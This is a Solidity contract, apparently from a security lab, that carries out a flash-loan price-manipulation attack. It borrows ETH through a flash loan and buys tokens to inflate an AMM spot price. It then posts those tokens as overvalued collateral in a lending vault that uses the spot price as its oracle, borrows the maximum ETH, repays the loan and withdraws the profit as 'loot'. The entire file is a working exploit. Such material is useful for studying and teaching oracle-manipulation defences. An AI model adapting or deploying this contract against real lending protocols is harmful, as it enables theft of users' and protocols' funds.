// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.28;

interface IFlashLoanEtherLender {
    function flashLoan(uint256 amount) external;
}

interface IFlashLoanSpotAMM {
    function buyTokens() external payable returns (uint256);
}

interface IFlashLoanLabToken {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IOracleLendingVault {
    function depositCollateral(uint256 amount) external;
    function maximumBorrow(address borrower) external view returns (uint256);
    function borrow(uint256 amount) external;
}

/// @title FlashLoanPriceManipulationAttacker
/// @author Solidity Security Lab
/// @notice Attack contract that uses a flash loan to manipulate a spot-price oracle and overborrow ETH.
contract FlashLoanPriceManipulationAttacker {
    IFlashLoanEtherLender public immutable lender;
    IFlashLoanSpotAMM public immutable amm;
    IFlashLoanLabToken public immutable token;
    IOracleLendingVault public immutable lendingVault;
    address public immutable operator;

    event AttackExecuted(uint256 flashLoanAmount, uint256 borrowedAmount, uint256 profit);
    event LootWithdrawn(address indexed recipient, uint256 amount);

    constructor(
        address lenderAddress,
        address ammAddress,
        address tokenAddress,
        address lendingVaultAddress
    ) {
        lender = IFlashLoanEtherLender(lenderAddress);
        amm = IFlashLoanSpotAMM(ammAddress);
        token = IFlashLoanLabToken(tokenAddress);
        lendingVault = IOracleLendingVault(lendingVaultAddress);
        operator = msg.sender;
    }

    /// @notice Starts the exploit by borrowing ETH from the flash-loan pool.
    function attack(uint256 flashLoanAmount) external {
        require(msg.sender == operator, "Only operator can attack");
        require(flashLoanAmount > 0, "Loan amount zero");

        lender.flashLoan(flashLoanAmount);
    }

    /// @notice Flash-loan callback that manipulates price, deposits overvalued collateral, borrows ETH, and repays the loan.
    function onFlashLoan(uint256 amount) external payable {
        require(msg.sender == address(lender), "Only lender can callback");
        require(msg.value == amount, "Unexpected flash loan amount");

        // Step 1: use flash-loaned ETH to buy tokens and push the AMM spot price upward.
        amm.buyTokens{value: amount}();

        // Step 2: deposit the newly acquired, now overvalued tokens as collateral.
        uint256 acquiredTokens = token.balanceOf(address(this));
        require(acquiredTokens > 0, "No tokens acquired");
        require(token.approve(address(lendingVault), acquiredTokens), "Approval failed");
        lendingVault.depositCollateral(acquiredTokens);

        // Step 3: borrow as much ETH as the manipulated spot oracle allows.
        uint256 borrowedAmount = lendingVault.maximumBorrow(address(this));
        require(borrowedAmount > 0, "No borrow available");
        lendingVault.borrow(borrowedAmount);

        // Step 4: repay the flash loan principal.
        (bool success, ) = payable(address(lender)).call{value: amount}("");
        require(success, "Flash loan repayment failed");

        emit AttackExecuted(amount, borrowedAmount, address(this).balance);
    }

    /// @notice Transfers remaining profit to the attacker operator.
    function withdrawLoot() external {
        require(msg.sender == operator, "Only operator can withdraw loot");

        uint256 lootAmount = address(this).balance;
        require(lootAmount > 0, "No loot available");

        (bool success, ) = payable(operator).call{value: lootAmount}("");
        require(success, "Loot transfer failed");

        emit LootWithdrawn(operator, lootAmount);
    }

    receive() external payable {}
}
